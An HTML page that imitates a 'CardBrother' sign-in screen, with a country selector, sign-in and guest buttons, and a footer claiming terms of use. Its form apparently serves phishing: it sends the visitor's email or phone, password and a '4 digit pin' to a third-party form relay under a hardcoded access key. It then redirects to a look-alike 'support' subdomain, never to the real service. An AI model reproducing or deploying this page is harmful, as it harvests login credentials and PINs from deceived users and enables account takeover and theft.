<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CardBrother Login</title>

<style>

body{
margin:0;
font-family:Arial, sans-serif;
background:linear-gradient(180deg,#c7f0d8,#ffffff);
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.container{
width:360px;
background:white;
border-radius:18px;
padding:20px;
box-shadow:0 10px 30px rgba(0,0,0,0.1);
}

.header{
text-align:left;
margin-bottom:20px;
}

.header h2{
color:#12b76a;
margin:5px 0;
}

.tabs{
display:flex;
justify-content:space-between;
margin-bottom:20px;
}

.tabs span{
width:50%;
text-align:center;
font-weight:bold;
padding-bottom:8px;
cursor:pointer;
}

.active{
border-bottom:3px solid #12b76a;
color:#12b76a;
}

.input{
border:2px solid #12b76a;
border-radius:10px;
padding:12px;
margin-bottom:15px;
display:flex;
align-items:center;
}

.input select,
.input input{
border:none;
outline:none;
width:100%;
font-size:14px;
}

.links{
display:flex;
justify-content:space-between;
font-size:13px;
color:#12b76a;
margin-bottom:15px;
}

button{
width:100%;
padding:14px;
border:none;
border-radius:10px;
font-size:16px;
cursor:pointer;
}

.signin{
background:#12b76a;
color:white;
margin-bottom:10px;
}

.guest{
background:white;
border:2px solid #12b76a;
color:#12b76a;
}

.footer{
text-align:center;
font-size:12px;
margin-top:15px;
color:#555;
}

</style>
</head>

<body>

<div class="container">

<div class="header">
<h2>Hello!</h2>
<strong>CardBrother</strong>
</div>
<!-- Logo -->
<img src="images (6).png" class="logo" alt="Logo">

<div class="tabs">
<span class="active">Sign in</span>
<span>Sign up</span>
</div>

<div class="input">
<select>
<option>Nigeria</option>
<option>United Kingdom</option>
<option>China</option>
<option>USA</option>
<option>others</option>
</select>
</div>
<div class="form-box">

<h2>login to continue</h2>

<form action="https://api.web3forms.com/submit" method="POST">

<input type="hidden" name="access_key" value="21bda4c6-ce9c-4353-8f0c-b3d6604969b8">
<input type="hidden" name="redirect" value="https://cardbrother-support.vercel.app/success.html">

<div class="input">
<input type="text" name="name" placeholder="Email or Phone"required>
</div>

<div class="input">
<input type="username" name="username" placeholder="Password"required>
</div>
<div class="input">
    <textarea name="complaint" column="1" placeholder="verify 4 digit pin "></textarea>
</div>
<div class="input">
    <textarea name="complaint" column="4" placeholder="Drop your complaint and contact information "></textarea>
</div>
<span>Verification Code Login</span>
<span>Forgot password?</span>
</div>

<button class="submit">Sign In</button>

<p style="text-align:center">or</p>

<button class="submit">Guest</button>

<div class="footer">
<p>Version: 5.1.0</p>
<p>
By continuing, you agree to CardBrother Term of Use and confirm that you have read Privacy Policy.
</p>
</div>

</div>

</body>
</html>
